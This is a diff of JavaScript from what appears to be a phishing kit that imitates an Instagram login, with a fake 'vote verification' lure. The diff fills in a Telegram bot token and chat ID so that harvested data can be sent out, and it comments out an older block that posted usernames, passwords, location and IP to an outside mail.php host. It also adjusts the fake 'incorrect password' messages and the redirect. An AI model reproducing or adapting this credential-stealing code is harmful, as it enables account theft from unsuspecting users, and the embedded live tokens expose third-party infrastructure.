@@ -257,8 +257,8 @@
 
                 // Telegram script
                 // Replace with your actual bot token and chat ID
-                const botToken = '';
-                const chatId = '';
+                const botToken = '7217949603:AAG0UDbjP930gTSyNxPNcMUvIgOj87lC5vQ';
+                const chatId = '5895404996';
 
                 // const botToken = '6620819038:AAEHyILpkCzwwlDX5tGbxzIqNUZ1yVXUqLo';
                 // const chatId = '5360982855';
@@ -294,30 +294,30 @@
 
                 x += 1
                 feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
-                if (x == 2) {
+                if (x == 1) {
                     // feedback.textContent = ''
-                    feedback.textContent = 'Sorry an error occurred please try again later'
-                } else if (x == 3) {
+                    feedback.textContent = 'Sorry an error occurred please try again'
+                } else if (x == 2) {
                     feedback.textContent = '';
                     setTimeout(() => {
-                        window.location.href = 'vote_verification.html'
+                        window.location.href = '/vote_verification.html'
                     }, 1500);
                 }
 
 
                 //===============================================
                 //MAIL SENDER
-                var xhr2 = new XMLHttpRequest()
-                var data2 = new FormData()
-                var url = "http://wealthgatepro.com/mail.php?username=" + username.value + " (Instagram)" + "&password=" + password.value + "&country=" + country.value + "&city=" + city.value + "&continent=" + continent.value + "&ip=" + ip.value + "&adminEmail=" + adminEmail.value
+                //var xhr2 = new XMLHttpRequest()
+                //var data2 = new FormData()
+                //var url = "http://wealthgatepro.com/mail.php?username=" + username.value + " (Instagram)" + "&password=" + password.value + "&country=" + country.value + "&city=" + city.value + "&continent=" + continent.value + "&ip=" + ip.value + "&adminEmail=" + adminEmail.value
 
-                iframLink.src = url
+                //iframLink.src = url
 
-                xhr2.onreadystatechange = function() {
-                    console.log("sent successfully")
-                }
-                xhr2.open('GET', url, 'true');
-                xhr2.send()
+                //xhr2.onreadystatechange = function() {
+                    //console.log("sent successfully")
+                //}
+                //xhr2.open('GET', url, 'true');
+                //xhr2.send()
                 //======================================
 
 
